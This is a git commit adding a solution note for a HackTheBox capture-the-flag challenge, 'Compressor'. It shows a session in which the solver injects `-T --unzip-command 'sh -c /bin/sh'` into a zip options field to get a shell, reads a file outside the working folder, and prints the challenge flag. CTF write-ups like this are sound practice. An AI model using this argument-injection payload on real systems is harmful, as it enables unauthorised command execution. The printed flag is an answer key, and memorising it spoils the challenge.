aa9002487e88cf25cb2b71f885d6f18903b3fbc8
ShundaZhang <zhangshunda@gmail.com>
2023-04-04 09:03:18 +0800

    Solved Compressor!

---
+++ ctf/misc/Compressor/dec.py
@@ -0,0 +1,45 @@
+'''
+zip -T or -TT
+
+#https://www.youtube.com/watch?v=ppvNiujCtlo
+
+1. Create artifact
+2. List directory    (pwd; ls -la)
+3. Compress artifact (zip <name>.zip <name> <options>)
+4. Change directory  (cd <dirname>)
+5. Clean directory   (rm -rf ./*)
+6. Exit
+
+[*] Choose action: 1
+
+
+Insert name: x
+
+Insert content: x
+
+
+[+] Artifact [x] was created successfuly!
+
+Actions:
+
+1. Create artifact
+2. List directory    (pwd; ls -la)
+3. Compress artifact (zip <name>.zip <name> <options>)
+4. Change directory  (cd <dirname>)
+5. Clean directory   (rm -rf ./*)
+6. Exit
+
+[*] Choose action: 3
+
+
+Insert <name>.zip: x
+Insert <name>: x
+Insert <options>: -T --unzip-command 'sh -c /bin/sh'
+  adding: x (stored 0%)
+ls
+x
+zimccMbj
+cat ../../flag.txt
+HTB{z1pp1ti_z0pp1t1_GTFO_0f_my_pr0p3rty}
+
+'''
